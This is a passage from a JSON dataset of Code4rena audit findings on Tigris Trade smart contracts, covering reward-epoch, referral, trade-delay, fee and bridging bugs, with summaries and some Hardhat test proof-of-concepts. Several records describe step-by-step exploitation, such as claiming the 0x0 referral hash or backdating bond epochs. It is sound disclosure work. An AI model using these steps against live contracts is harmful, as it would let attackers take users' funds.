_owner, id);\n    }\n```\n\nif a bond get wrong value for mint epoch it would have wrong value for expire epoch and user would get a lot of share by lock for small time. for example this scenario:\n1. let's assume `epoch[asset1]` is out dated and it shows 30 days ago epoch. (`allowedAsset[asset1]` was false so locking was not possible and then is set as true after 30 days)\n2. during this time because `totalShare[asset1]` was 0 so `distribute()` function won't udpate `epoch[asset1]` and `epoch[asset1]` would show 30 days ago.\n3. attacker would create a lock for 32 days by calling `Lock.lock(asset1)`. code would call `BondNFT.createLock()` and would create a bond for attacker which epoch start time is 30 days ago and epoch expire time is 2 days later and attacker receives shares for 32 days.\n4. some reward would get distributed into the BondNFT for the `asset1`.\n5. other users would create lock too.\n6. attacker would claim his rewards and his rewards would be for 32 day locking but attacker lock his tokens for 2 days in reality.\n\nso attacker was able to create lock for long time and get shares and rewards based on that but attacker can release lock after short time.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\nupdate `epoch[asset]` in `distribute()` function  even when `totalShares[_tigAsset]` is equal to 0. only the division by zero and fund transfer should be prevented when totalShare is zero and `epoch[asset]` index should be updated.",
      "summary": "\nThis bug report is about a vulnerability in the BondNFT.sol contract which is part of the code-423n4/2022-12-tigris repository. The vulnerability is related to the `BondNFT.createLock()` function, which creates a bond and sets the bond's mint epoch as `epoch[asset]`. The `Lock.lock()` function calls `claimGovFees()` which calls `BondNFT.distribute()` for all assets and updates the `epoch[assets]` for all assets. \n\nHowever, if `totalShares[tigAsset] == 0` for an asset, then `distribute()` won't update `epoch[asset]` for that asset and `epoch[asset]` will be some old epoch, which will be the start time where asset is added or the time where `totalShares[_tigAsset] != 0`. This would make `createLock()` to set a very wrong value for bond's mint epoch when `totalShares[tigAsset] == 0`.\n\nThis vulnerability would happen for the first bond that has been created for that asset always and it will happen again if for some period `totalShares[asset]` become 0, then the next bond would have wrong mint epoch. It can also happen when `setAllowedAsset(asset, false)`  has been called for that asset.\n\nThe recommended mitigation step for this vulnerability is to update `epoch[asset]` in `distribute()` function even when `totalShares[_tigAsset]` is equal to 0. The division by zero and fund transfer should be prevented when totalShare is zero and `epoch[asset]` index should be updated. VIM was used as the tool for this bug report.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/436",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "6345",
      "title": "[M-15] _checkDelay will not work properly for Arbitrum or Optimism due to block.number ",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L857-L868\n\n\n## Vulnerability details\n\n## Impact\n\nTrade delay will not work correctly on Arbitrum allowing users to exploit multiple valid prices \n\n## Proof of Concept\n\n    function _checkDelay(uint _id, bool _type) internal {\n        unchecked {\n            Delay memory _delay = blockDelayPassed[_id];\n            //in those situations\n            if (_delay.actionType == _type) {\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n            } else {\n                if (block.number < _delay.delay) revert(\"0\"); //Wait\n                blockDelayPassed[_id].delay = block.number + blockDelay;\n                blockDelayPassed[_id].actionType = _type;\n            }\n        }\n    }\n\n_checkDelay enforces a delay of a specific number of block between opening and closing a position. While this structure will work on mainnet, it is problematic for use on Arbitrum. According to Arbitrum [Docs](https://developer.offchainlabs.com/time) `block.number` returns the most recently synced L1 block number. Once per minute the block number in the Sequencer is synced to the actual L1 block number. This period could be abused to completely bypass this protection. The user would open their position 1 Arbitrum block before the sync happens, the close it the very next block. It would appear that there has been 5 block (60 / 12) since the last transaction but in reality it has only been 1 Arbitrum block. Given that Arbitrum has 2 seconds blocks I would be impossible to block this behavior through parameter changes.\n\nIt also presents an issue for [Optimism](https://community.optimism.io/docs/developers/build/differences/#block-numbers-and-timestamps) because each transaction is it's own block. No matter what value is used for the block delay, the user can pad enough tiny transactions to allow them to close the trade immediately. \n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nThe delay should be measured using block.timestamp rather than block.number",
      "summary": "\nThis bug report is about a vulnerability that allows users to exploit multiple valid prices by bypassing a trade delay on Arbitrum. The trade delay is enforced by the function _checkDelay which uses block.number to measure the delay. However, since the block.number is only synced once per minute, users can open and close their position within the same Arbitrum block, appearing as if the delay was respected when it wasn't. The same issue occurs on Optimism, where each transaction is its own block.\n\nThe recommended mitigation step is to use block.timestamp instead of block.number to measure the delay. This way, the delay will be respected regardless of how many transactions are included in the same block.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/419",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "6344",
      "title": "[M-14] BondNFT.sol#claim() needs to correct all the missing epochs",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L177-L183\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L235-L242\n\n\n## Vulnerability details\n\n## Impact\n\nIn `BondNFT.sol#claim()`, `accRewardsPerShare[][]` is amended to reflect the expired shares. But only `accRewardsPerShare[bond.asset][epoch[bond.asset]]` is updated. All the epochs between `bond.expireEpoch-1` and `epoch[bond.asset]` are missed. However, some users claimable rewards calculation could be based on the missed epochs. As a result, the impact might be:\n- `accRewardsPerShare` be inaccurate for the epochs in between.\n- some users could lose reward due to wrong `accRewardsPerShare`, some users might receive undeserved rewards.\n- some rewards will be locked in the contract.\n\n\n## Proof of Concept\n\nThe rationale behind the unchecked block below seems to take into account the shares of reward of the expired bond. However, if only update the latest epoch data, the epochs in between could have errors and lead to loss of other users.\n\n```solidity\nFile: contracts/BondNFT.sol\n168:     function claim(\n169:         uint _id,\n170:         address _claimer\n171:     ) public onlyManager() returns(uint amount, address tigAsset) {\n    \n177:             if (bond.expired) {\n178:                 uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);\n179:                 if (totalShares[bond.asset] > 0) {\n180:                     accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n181:                 }\n182:             }\n183:             bondPaid[_id][bond.asset] += amount;\n```\n\nUsers can claim rewards up to the expiry time, based on `accRewardsPerShare[tigAsset][bond.expireEpoch-1]`:\n```solidity\n235:     function idToBond(uint256 _id) public view returns (Bond memory bond) {\n    \n238:         bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n239:         unchecked {\n240:             uint _accRewardsPerShare = accRewardsPerShare[bond.asset][bond.expired ? bond.expireEpoch-1 : epoch[bond.asset]];\n241:             bond.pending = bond.shares * _accRewardsPerShare / 1e18 - bondPaid[_id][bond.asset];\n\n```",
      "summary": "\nThis bug report is about the `BondNFT.sol#claim()` function in the BondNFT.sol file on the GitHub repository code-423n4/2022-12-tigris. The bug is that when a user claims rewards, the `accRewardsPerShare[][]` array is amended to reflect the expired shares, but only the `accRewardsPerShare[bond.asset][epoch[bond.asset]]` is updated. This means that any epochs between `bond.expireEpoch-1` and `epoch[bond.asset]` are missed, which could lead to inaccurate `accRewardsPerShare` values and some users losing or receiving undeserved rewards.\n\nThe proof of concept for this bug is that the rationale behind the unchecked block in the `BondNFT.sol#claim()` function is to take into account the shares of reward of the expired bond. However, if only the latest epoch data is updated, the epochs in between could have errors and lead to loss of other users. Additionally, users can claim rewards up to the expiry time, based on `accRewardsPerShare[tigAsset][bond.expireEpoch-1]`. \n\nOverall, this bug could lead to inaccurate rewards calculations, some users losing or receiving undeserved rewards, and some rewards being locked in the contract.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/392",
      "tags": [],
      "finders": [
        "__141345__"
      ]
    },
    {
      "id": "6343",
      "title": "[M-13] One can become referral of hash 0x0 and because all users default referral hash is 0x0 so he would become all users referral by default and earn a lot of fees while users didn’t approve it",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Referrals.sol#L20-L24\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/TradingExtension.sol#L148-L152\n\n\n## Vulnerability details\n\n## Impact\nBy default the value of `_referred[user]` is 0x0 for all users and if one set 0x0 as his referral hash then he would become referral for all the users who didn't set referral by default and he would earn a lot of referral funds that users didn't approve it.\n\n## Proof of Concept\nThis is `createReferralCode()` code:\n```\n    function createReferralCode(bytes32 _hash) external {\n        require(_referral[_hash] == address(0), \"Referral code already exists\");\n        _referral[_hash] = _msgSender();\n        emit ReferralCreated(_msgSender(), _hash);\n    }\n```\nAs you can see attacker can become set 0x0 as his hash referral by calling `createReferralCode(0x0)` and code would set `_referral[0x0] = attackerAddress` (attacker needs to be the first one calling this).\nThen in the `getRef()` code the logic would return `attackerAddress` as referral for all the users who didn't set referral.\n```\n    function getRef(\n        address _trader\n    ) external view returns(address) {\n        return referrals.getReferral(referrals.getReferred(_trader));\n    }\n```\nin the code, getReferred(trader) would return 0x0 because trader didn't set referred and getReferral(0x0) would return attackerAddress.\n`_handleOpenFees()` and `_handleCloseFees()` function in the Trading contract would use `getRef(trader)` and they would transfer referral fee to attackerAddress and attacker would receive fee form a lot of users which didn't set any referral, those users didn't set any referral and didn't approve attacker receiving referral fees from them and because most of the users wouldn't know about this and referral codes so attacker would receive a lot of funds.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\nprevent some one from setting 0x0 hash for their referral code.",
      "summary": "\nThis bug report describes a vulnerability in the code of a smart contract that could be exploited to allow an attacker to gain referral fees without the consent of the users. The vulnerability lies in the fact that the value of the ‘_referred[user]’ variable is set to 0x0 for all users by default, and if an attacker sets 0x0 as their referral hash, they would become the referral for all users who did not set a referral code. This would allow the attacker to earn referral fees from these users without their consent.\n\nThe vulnerability can be exploited by the attacker calling the ‘createReferralCode()’ function with 0x0 as the hash parameter. This would set the ‘_referral[0x0]’ variable to the attacker’s address. The ‘getRef()’ function in the smart contract then returns the attacker’s address as the referral for all users who have not set a referral code. This would result in the ‘_handleOpenFees()’ and ‘_handleCloseFees()’ functions transferring referral fees to the attacker’s address.\n\nThe recommended mitigation step is to prevent someone from setting 0x0 as their referral code.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/379",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "6342",
      "title": "[M-12] Centralization risks: owner can freeze withdraws and use timelock to steal all funds",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L222-L230> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L78-L83> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableToken.sol#L38-L46> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/PairsContract.sol#L48>\n\nThe project heavily relies on nodes/oracles, which are EOAs that sign the current price.\n\nSince all functions (including withdrawing) require a recently-signed price, the owner(s) of those EOA can freeze all activity by not providing signed prices.\n\nI got from the sponsor that the owner of the contract is going to be a timelock contract.\nHowever, once the owner holds the power to pause withdrawals - that nullifies the timelock. The whole point of the timelock is to allow users to withdraw their funds when they see a pending malicious tx before it's executed. If the owner has the power to freeze users' funds in the contract, they wouldn't be able to do anything while the owner executes his malicious activity.\n\nBesides that, there are also LP funds, which are locked to a certain period, and also can't withdraw their funds when they see a pending malicious timelock tx.\n\n### Impact\n\nThe owner (or attacker who steals the owner's wallet) can steal all user's funds.\n\n### Proof of Concept\n\n*   The fact that the protocol relies on EOA signatures is pretty clear from the code and docs\n*   The whole project relies on the 'StableVault' and 'StableToken'\n    *   The value of the 'StableToken' comes from the real stablecoin that's locked in 'StableVault', if someone manages to empty the 'StableVault' from the deposited stablecoins the 'StableToken' would become worthless\n*   The owner has a few ways to drain all funds:\n    *   Replace the minter via `StableToken.setMinter()`, mint more tokens, and redeem them via `StableVault.withdraw()`\n    *   List a fake token at `StableVault`, deposit it and withdraw real stablecoin\n    *   List a new fake asset for trading with a fake chainlink oracle, fake profit with trading with fake prices, and then withdraw\n        *   They can prevent other users from doing the same by setting `maxOi` and opening position in the same tx\n    *   Replace the MetaTx forwarder and execute tx on behalf of users (e.g. transferring bonds, positions and StableToken from their account)\n\n### Recommended Mitigation Steps\n\n*   Rely on a contract (chainlink/Uniswap) solely as an oracle\n*   Alternately, add functionality to withdraw funds at the last given price in case no signed data is given for a certain period\n    *   You can do it by creating a challenge in which a user requests to close his position at a recent price, if no bot executes it for a while it can be executed at the last recorded price.\n*   As for LPs' funds, I don't see an easy way around it (besides doing significant changes to the architecture of the protocol), this a risk LPs should be aware of and decide if they're willing to accept.\n\n**[TriHaz (Tigris Trade) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/377#issuecomment-1377601222):**\n > We are aware of the centralization risks. Owner of contracts will be a timelock and owner will be a multi sig to reduce the centralization for now until it's fully controlled by DAO.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/377#issuecomment-1383157493):**\n > Missing setFees, but am grouping generic reports under this one as well.\n>\n > Also missing changes to Trading Extension and Referral Fees.\n>\n > This report, in conjunction with [#648](https://github.com/code-423n4/2022-12-tigris-findings/issues/648) effectively covers all \"basic\" admin privilege findings. More nuanced issues are judged separately.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in a project that heavily relies on nodes/oracles, which are EOAs that sign the current price. The vulnerability is that the owner of the contract can freeze all activity by not providing signed prices, which would allow them to steal all user's funds. The proof of concept is that the owner has a few ways to drain all funds, such as replacing the minter via `StableToken.setMinter()`, listing a fake token at `StableVault`, listing a new fake asset for trading with a fake chainlink oracle, and replacing the MetaTx forwarder and executing transactions on behalf of users.\n\nThe recommended mitigation steps are to rely on a contract (chainlink/Uniswap) solely as an oracle and to add functionality to withdraw funds at the last given price in case no signed data is given for a certain period. As for LPs' funds, there is no easy way around it, but this a risk LPs should be aware of and decide if they're willing to accept.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/377",
      "tags": [
        "Admin"
      ],
      "finders": [
        "philogy",
        "ladboy233",
        "0xSmartContract",
        "HE1M",
        "peanuts",
        "JohnnyTime",
        "yjrwkk",
        "francoHacker",
        "jadezti",
        "Faith",
        "0xNazgul",
        "orion",
        "rbserver",
        "kwhuo68",
        "gz627",
        "aviggiano",
        "Mukund",
        "0xA5DF",
        "hihen",
        "cccz",
        "0xbepresent",
        "Englave",
        "Ruhum",
        "wait",
        "Madalad",
        "hansfriese",
        "SmartSek",
        "imare",
        "0xdeadbeef0x",
        "chaduke",
        "8olidity",
        "__141345__",
        "gzeon",
        "carlitox477"
      ]
    },
    {
      "id": "6341",
      "title": "[M-11] _handleOpenFees returns an incorrect value for _feePaid. This directly impacts margin calculations",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734\n\n\n## Vulnerability details\n\n## Impact\n\nFormula for `fee paid` in [Line 734](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L734) is incorrect leading to incorrect margin calculations. Since this directly impacts the trader margin and associated fee calculations, I've marked as HIGH risk\n\nOn initiating a market order, `Margin` is adjusted for the `fees` that is charged by protocol. This adjustment is in [Line 178 of Trading](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178). Fees computed by `_handleOpenFees ` is deducted from Initial margin posted by user.\n\nformula misses to account the `2*referralFee` component while calculaing `_feePaid`\n\n## Proof of Concept\nNote that `_feePaid` as per formula in Line 734 is the sum of `_daoFeesPaid', and sum of `burnerFee` & `botFee`. `_daoFeesPaid` is calculated from `_fees.daoFees` which itself is calculated by subtracting `2*referralFee` and `botFee`. \n\nSo when we add back `burnerFee` and `botFee` to `_feePaid`, we are missing to add back the `2*referralFee`  which was earlier excluded when calculating `_daoFeesPaid`. While `botFee` is added back correctly, same adjustment is not being done viz-a-viz referral fee.\n\n This results in under calculating the `_feePaid` and impacts the rewards paid to the protocol NFT holders.\n\n\n## Tools Used\n\n## Recommended Mitigation Steps\n\nSuggest replacing the formula in line 734 with below (adding back _fees.referralFees*2)\n\n```\n            _feePaid =\n                _positionSize\n                * (_fees.burnFees + _fees.botFees + _fees.referralFees*2 ) \n                / DIVISION_CONSTANT // divide by 100%\n                + _daoFeesPaid;\n```",
      "summary": "\nThis bug report is about the incorrect formula for calculating the 'fee paid' in line 734 of the Trading.sol file in the code-423n4/2022-12-tigris repository. This incorrect formula leads to incorrect margin calculations which directly affects the trader margin and associated fee calculations. This is considered a high risk vulnerability. \n\nThe issue is that the formula for 'fee paid' is missing to account for the '2*referralFee' component when calculating '_feePaid'. The '_feePaid' should be the sum of '_daoFeesPaid', 'burnerFee' and 'botFee'. The '_daoFeesPaid' is calculated from '_fees.daoFees' which itself is calculated by subtracting '2*referralFee' and 'botFee'. When 'burnerFee' and 'botFee' are added back to '_feePaid', the '2*referralFee' is not being added back which results in under calculating the '_feePaid' and affects the rewards paid to the protocol NFT holders. \n\nThe recommended mitigation step is to replace the formula in line 734 with one that adds back the '_fees.RefferalFees*2'. This should resolve the incorrect margin calculations and associated fee calculations.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/367",
      "tags": [],
      "finders": [
        "chaduke",
        "0Kage"
      ]
    },
    {
      "id": "6340",
      "title": "[M-10] BondNFT.extendLock force a user to extend the bond at least for current bond.period",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L97-L125\n\n\n## Vulnerability details\n\n## Description\nThe current implementation forces a user to extend their bonds for at least they current bond period. These mean that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.\n\nIf we consider that a bond should have at least a 7 days lock and at the most 365 days, then the current ```BondNFT.extendLock``` function should be refactored.\n\n## Impact\n* Current ```BondNFT.extendLock``` function does not work as expected, forcing user who want to extend their bond to extend them at least for their current bond.period.\n* For bonds which were set with a lock period of 365 days, they can not be extended, even after days of their creation.\n\n## POC\n```typescript\n// In 09.Bond.js,  describe \"Extending lock\"\nit(\"POC: Extending the lock does not work as expected\", async function () {\n      await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"100\"));\n      // user lock bond funds for 10 days\n      await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 10);\n\n      const fiveDaysTime = 5 * 24 * 60 * 60\n      const eightDaysTime = 8 * 24 * 60 * 60\n\n      // owner distribute rewards\n      console.log(\"User created a lock for 10 days\")\n      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"10\"));\n      await bond.connect(owner).distribute(stabletoken.address, ethers.utils.parseEther(\"10\"));\n\n      // Five days pass\n      await network.provider.send(\"evm_increaseTime\", [fiveDaysTime]); // Skip 10 days\n      await network.provider.send(\"evm_mine\");\n      console.log(\"\\n5 days pass\")\n\n      // User decide to extend their lock three days, given the current implementation the user is forced to extended 13 days\n      const bondInfoBeforeExtension = await bond.idToBond(1)\n      console.log(`Bond info before extension: {period: ${bondInfoBeforeExtension.period}, expireEpoch: ${bondInfoBeforeExtension.expireEpoch}}`)\n      \n      await lock.connect(user).extendLock(1, 0, 3)\n      console.log(\"Bond was extended for 3 days\")\n      const bondInfoAfterExtension = await bond.idToBond(1)\n      console.log(`Bond info after extension: {period: ${bondInfoAfterExtension.period}, expireEpoch: ${bondInfoAfterExtension.expireEpoch}}`)\n\n      // 8 days pass, user should be able to release the bond given the extension of 3 days (8 days should be enough)\n      await network.provider.send(\"evm_increaseTime\", [eightDaysTime]);\n      await network.provider.send(\"evm_mine\");\n      console.log(\"\\n8 days later\")\n      console.log(\"After 13 days (10 original days + 3 days from extension) the user can not release the bond\")\n      \n      // The user decide to claim their part and get their bond amount\n      // The user should recieve all the current funds in the contract\n      await expect(lock.connect(user).release(1)).to.be.revertedWith('!expire')\n\n    });\n```\n\n## Mitigation steps\nIn order to ```extendLock``` to work properly, the current implementation  should be changed to:\n```diff\nfunction extendLock(\n    uint _id,\n    address _asset,\n    uint _amount,\n    uint _period,\n    address _sender\n) external onlyManager() {\n    Bond memory bond = idToBond(_id);\n    Bond storage _bond = _idToBond[_id];\n    require(bond.owner == _sender, \"!owner\");\n    require(!bond.expired, \"Expired\");\n    require(bond.asset == _asset, \"!BondAsset\");\n    require(bond.pending == 0); //Cannot extend a lock with pending rewards\n+   uint currentEpoch = block.timestamp/DAY;\n-   require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n    require(epoch[bond.asset] == currentEpoch, \"Bad epoch\");\n\n+   uint pendingEpochs = bond.expireEpoch - currentEpoch;\n+   uint newBondPeriod = pendingEpochs + _period;\n+   //In order to respect min bond period when we extend a bon\n+   // Next line can be omitted at discretion of the protocol and devs\n+   // If it is omitted any created bond would be able to be extended always (except from those with period = 365)\n+   require(newBondPeriod >= 7, \"MIN PERIOD\");\n\n-    require(bond.period+_period <= 365, \"MAX PERIOD\");\n+    require(newBondPeriod <= 365, \"MAX PERIOD\");\n    \n    unchecked {\n-       uint shares = (bond.amount + _amount) * (bond.period + _period) / 365;\n+       uint shares = (bond.amount + _amount) * newBondPeriod / 365;\n\n-       uint expireEpoch = block.timestamp/DAY + bond.period + _period;\n+       uint expireEpoch = currentEpoch + newBondPeriod;\n\n        totalShares[bond.asset] += shares-bond.shares;\n        _bond.shares = shares;\n        _bond.amount += _amount;\n        _bond.expireEpoch = expireEpoch;\n        _bond.period += _period;\n        _bond.mintTime = block.timestamp; \n-       _bond.mintEpoch = epoch[bond.asset];\n+       _bond.mintEpoch = currentEpoch;\n-       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18;\n+       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][currentEpoch] * _bond.shares / 1e18;\n    }\n    emit ExtendLock(_period, _amount, _sender,  _id);\n}\n```",
      "summary": "\nThis bug report is about a vulnerability in the current implementation of the BondNFT.sol contract. The current ```BondNFT.extendLock``` function forces a user to extend their bonds for at least their current bond period. This means that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.\n\nThe impact of this vulnerability is that users who want to extend their bond are forced to extend them at least for their current bond period. Additionally, bonds which were set with a lock period of 365 days can not be extended, even after days of their creation.\n\nA proof of concept (POC) is provided for this vulnerability. It describes a scenario in which a user creates a bond for 10 days, and then tries to extend it for 3 days after 5 days have passed. However, due to the current implementation, the user is forced to extend the bond for 13 days. After 8 days, the user is still not able to release the bond.\n\nThe mitigation steps for this vulnerability are to refactor the ```BondNFT.extendLock``` function. This includes changing the implementation to allow users to extend their bond period for less than their current bond period, and also to respect the minimum bond period when extending a bond.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/359",
      "tags": [],
      "finders": [
        "carlitox477"
      ]
    },
    {
      "id": "6339",
      "title": "[M-09] safeTransferMany() doesn’t actually use safe transfer",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L247\nhttps://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L285\n\n\n## Vulnerability details\n\nBoth `BondNFT` and `GovNFT` are an ERC721 implementation, they both also have a function named `safeTransferMany()` which its name implies is supposed to safe transfer many tokens at once.\nHowever the function doesn't actually safe transfer (doesn't )\n\n## Impact\nUsers might use this function, expecting it to verify that the receiver is an `ERC721Receiver`, but will get their funds stuck in a contract that doesn't support ERC721.\n\n## Proof of Concept\nI've added the following tests to the `GovNFT` tests.\n1st test will succeed (tx will revert) since `safeTransferFrom()` does actually use safe transfer.\n2nd will fail (tx won't revert), since `safeTransferMany()` doesn't actually use a safe transfer.\n\n```diff\ndiff --git a/test/05.GovNFT.js b/test/05.GovNFT.js\nindex 711a649..d927320 100644\n--- a/test/05.GovNFT.js\n+++ b/test/05.GovNFT.js\n@@ -98,6 +98,14 @@ describe(\"govnft\", function () {\n       expect(await govnft.pending(owner.getAddress(), StableToken.address)).to.equal(1500);\n       expect(await govnft.pending(user.getAddress(), StableToken.address)).to.equal(500);\n     });\n+\n+    it(\"Safe transfer to non ERC721Receiver\", async function () {\n+      \n+      expect(govnft.connect(owner)['safeTransferFrom(address,address,uint256)'](owner.address,StableToken.address, 2)).to.be.revertedWith(\"ERC721: transfer to non ERC721Receiver implementer\");\n+    });\n+    it(\"Safe transfer many  to non ERC721Receiver\", async function () {\n+      await expect(govnft.connect(owner).safeTransferMany(StableToken.address, [2])).to.be.revertedWith(\"ERC721: transfer to non ERC721Receiver implementer\");\n+    });\n     it(\"Transferring an NFT with pending delisted rewards should not affect pending rewards\", async function () {\n       await govnft.connect(owner).safeTransferMany(user.getAddress(), [2,3]);\n       expect(await govnft.balanceOf(owner.getAddress())).to.equal(0);\n\n```\n\nOutput (I've shortened the output. following test will also fail, since the successful transfer will affect them):\n\n```\n      ✔ Safe transfer to contract\n      1) Safe transfer many to contract\n\n\n  11 passing (3s)\n  1 failing\n\n  1) govnft\n       Reward system related functions\n         Safe transfer many to contract:\n\n      AssertionError: Expected transaction to be reverted\n      + expected - actual\n\n      -Transaction NOT reverted.\n      +Transaction reverted.\n```\n\n\n## Recommended Mitigation Steps\nCall `_safeTransfer()` instead of `_transfer()`.",
      "summary": "\nThis bug report outlines a vulnerability in the `BondNFT` and `GovNFT` ERC721 implementations. The vulnerability is in the `safeTransferMany()` function, which does not actually use safe transfer and could lead to users getting their funds stuck in a contract that does not support ERC721. To prove the vulnerability, tests were added to the `GovNFT` tests that showed the expected behavior of the `safeTransferFrom()` function succeeding, but the `safeTransferMany()` function not reverting.\n\nThe recommended mitigation step is to call `_safeTransfer()` instead of `_transfer()` when using the `safeTransferMany()` function.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/356",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "8olidity",
        "0xmuxyz",
        "0xA5DF",
        "0x4non"
      ]
    },
    {
      "id": "6338",
      "title": "[M-08] GovNFT: maxBridge has no effect",
      "impact": "MEDIUM",
      "content": "\nIn GovNFT, setMaxBridge function is provided to set maxBridge, but this variable is not used, literally it should be used to limit the number of GovNFTs crossing chain, but it doesn't work in GovNFT.\n\n```solidity\n    uint256 public maxBridge = 20;\n...\n    function setMaxBridge(uint256 _max) external onlyOwner {\n        maxBridge = _max;\n    }\n```\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L19-L20> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L311-L313>\n\n### Recommended Mitigation Steps\n\nConsider applying the maxBridge variable.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/334#issuecomment-1399552931):**\n> The Warden has shown how, an unused variable, which was meant to cap the amount of tokens bridged per call, could cause a DOS.\n> \n> These types of DOS could only be fixed via Governance Operations, and could create further issues, for this reason I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) confirmed and resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/334#issuecomment-1407515433):**\n > Mitigation: 